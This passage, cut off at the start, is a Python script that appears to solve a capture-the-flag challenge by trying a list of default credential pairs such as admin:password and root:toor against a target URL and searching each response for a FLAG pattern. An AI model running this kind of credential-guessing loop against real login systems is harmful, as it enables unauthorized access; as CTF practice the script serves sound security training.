    ('admin', 'password'),
    ('admin', '123456'),
    ('admin', 'admin123'),
    ('admin', ''),
    ('root', 'root'),
    ('root', 'toor'),
    ('administrator', 'administrator'),
]

for username, password in weak_passwords:
    params = {'username': username, 'password': password}
    resp = requests.get(target, params=params)
    
    if 'FLAG{' in resp.text:
        flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
        print(f"[!!! FLAG FOUND !!!]")
        print(f"Credentials: {username}:{password}")
        print(f"Flag: {flag_match.group(0)}")
        print(f"\nFull Response:\n{resp.text}")
        exit(0)
    
    # Check response characteristics
    has_admin_msg = "not the admin" in resp.text.lower()
    print(f"[{username:15s}:{password:15s}] len={len(resp.text)} | {'not admin' if has_admin_msg else 'different'}")

print("\n[INVESTIGATION COMPLETE]")

